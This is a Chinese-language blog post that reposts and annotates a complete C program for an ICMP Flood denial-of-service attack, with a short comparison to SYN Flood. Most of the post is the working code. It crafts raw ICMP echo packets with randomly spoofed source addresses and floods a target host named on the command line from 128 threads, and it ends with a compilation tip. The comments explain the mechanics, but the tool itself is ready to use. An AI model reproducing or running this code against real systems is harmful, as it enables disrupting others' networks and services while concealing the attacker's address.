---
title: C语言实现ICMP Flood
date: 2018-09-28
tags: [C,网络]
---

内容: 非原创, 原作者写的很好, 转载

<!-- more -->

# 前言

**首先明确强调, 代码不是我写的, [出处是这里](https://blog.csdn.net/u014634338/article/details/49046071), 我只是阅读后觉得很好, 加上了自己的注释和解析**

我的注释以`/**/`形式出现

# 结构解析

ICMP Flood流程如下

1. 接收传参IP/端口, 检查合法性
2. 生成raw socket, 设置IP_HDRINCL选项允许自定义报文头部
3. 构造IP层内容/ICMP层内容(ICMP层的type置为ICMP_ECHO)
4. 计算IP层/ICMP层的checksum
5. 将IP层拼接ICMP层通过raw socket发送
6. 开多线程重复4/5步骤

对比下SYN Flood流程, 大同小异

1. 接收传参IP/端口, 检查合法性
2. 生成raw socket, 设置IP_HDRINCL选项允许自定义报文头部
3. 构造IP层内容/TCP层内容(TCP层的flag置为syn)
4. 计算IP层/TCP层的checksum(利用伪造的源IP来计算)
5. 将IP层拼接TCP层通过raw socket发送
6. 开多线程重复4/5步骤

# 代码

```c
//icmp攻击
//使用方式：./icmp ip(域名)
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <syslog.h>
#include <arpa/inet.h>
#include <setjmp.h>
#include <errno.h>

//最多线程数
#define MAXCHILD 128
//目的IP地址
struct sockaddr_in dest;
//ICMP协议的值
static int PROTO_ICMP = -1;
//程序活动标志
static int alive = -1;
static int rawsock;

static void DoS_icmp (void )
{
    struct sockaddr_in to;
    struct ip *iph;
    struct icmp *icmph;
    char *packet;
    int pktsize = sizeof (struct ip) + sizeof (struct icmp) + 64;
    packet =(char *)malloc (pktsize);
    iph = (struct ip *) packet; //定位IP报头部
    icmph = (struct icmp *) (packet + sizeof (struct ip)); //定位上层协议位置（ICMP报文头部）
    memset (packet, 0, pktsize);
    
    //IP的版本,IPv4
    iph->ip_v = 4;
    //IP头部长度,字节数
    iph->ip_hl = 5;
    //服务类型
    iph->ip_tos = 0;
    //IP报文的总长度
    iph->ip_len = htons (pktsize);
    //标识,设置为PID
    iph->ip_id = htons (getpid ());
    //段的偏移地址
    iph->ip_off = 0;
    //TTL
    iph->ip_ttl = 255;
    //协议类型
    /* ICMP Flood的ICMP */
    iph->ip_p = PROTO_ICMP;
    //校验和,先填写为0
    iph->ip_sum = 0;
    
    //发送的源地址，随机创建
    iph->ip_src.s_addr =random();
    
    //发送目标地址
    iph->ip_dst = dest.sin_addr;
    
    
    //ICMP类型为回显请求
    /* ICMP Flood用的是ICMP_ECHO报文, 也就是发送ICMP_ECHO request包, 也就是ping包 */
    icmph->icmp_type = ICMP_ECHO;
    //代码为0
    icmph->icmp_code = 0;
    //由于数据部分为0,并且代码为0,直接对不为0即icmp_type部分计算
    icmph->icmp_cksum = htons (~(ICMP_ECHO << 8));
    //填写发送目的地址部分
    to.sin_family =  AF_INET;
    to.sin_addr = dest.sin_addr;
    to.sin_port = htons(0);
    //发送数据
    sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &to, sizeof (struct sockaddr));
    //放内存
    free (packet);
}

void *DoS_fun (void * ip)
{
    while(alive)
    {
        DoS_icmp();
        
    }
    return NULL;
}

//信号处理函数,设置退出变量alive
void DoS_sig(int signo)
{
    alive = 0;
}

int main(int argc, char *argv[])
{
    struct hostent * host = NULL;
    struct protoent *protocol = NULL;
    char protoname[]= "icmp";   //协议名字
    int i = 0;
    pthread_t pthread[MAXCHILD]; //线程标志数组
    int err = -1;
    socklen_t on=1;
    alive = 1;
    
    //截取信号CTRL+C
    signal(SIGINT, DoS_sig);   //设置信号处理函数

    // 参数是否数量正确
    if(argc < 2)
    {
        printf("usage : \n");
        return -1;
    }

    // 获取协议类型ICMP
    /* 返回一个结构体, 包含协议的名字,编号等, 能完整标示一个协议的东西 */
    protocol = getprotobyname(protoname);  //获取指定协议的信息
    if (protocol == NULL)
    {
        perror("getprotobyname()");
        return -1;
    }
    /* ICMP协议在所有协议中的编号 */
    PROTO_ICMP = protocol->p_proto;     //ICMP协议的值
    //输入的目的地址为字符串IP地址
    /* 点分十进制转长整型 */
    dest.sin_addr.s_addr = inet_addr(argv[1]);
    /* 检验IP合法性 */
    if(dest.sin_addr.s_addr == INADDR_NONE)
    {
        //为DNS地址
        /* 是域名的话解析域名, 拿到ip, 后面用 */
        host = gethostbyname(argv[1]);
        if(host == NULL)
        {
            perror("gethostbyname");
            return -1;
            
        }
        char str[30];
        // printf("host:%s\n",inet_ntop(host->h_addrtype,host->h_addr,str,30));
        //  dest.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
        inet_aton(inet_ntop(host->h_addrtype,host->h_addr,str,30),&(dest.sin_addr));
    }
    //printf("dst ip: %s\n", inet_ntoa(dest.sin_addr));
    
    // 建立原始socket
    /* SYN Flood中是IPPROTO_TCP */
    rawsock = socket (AF_INET, SOCK_RAW, PROTO_ICMP);
    if (rawsock < 0)
    {
        perror("socket error");
        exit(1);
    }
    
    // 设置IP选项，自己构建IP报头部
    setsockopt (rawsock,IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    //建立多个线程协同工作
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, DoS_fun, (void *)&i);
    }
    //等待线程结束
    for(i=0; i<MAXCHILD; i++)
        pthread_join(pthread[i], NULL);
    
    printf("over \n");
    close(rawsock);
    return 0;
}
```

编译记得加`-lpthread`

# 参考资料

[原作者](https://blog.csdn.net/u014634338/article/details/49046071)

[这里的解析很结构化, 很详细](https://www.cnblogs.com/skyfsm/p/6395953.html)

[Linux网络编程---ICMP协议分析及ping程序实现](https://blog.csdn.net/u014634338/article/details/48951345)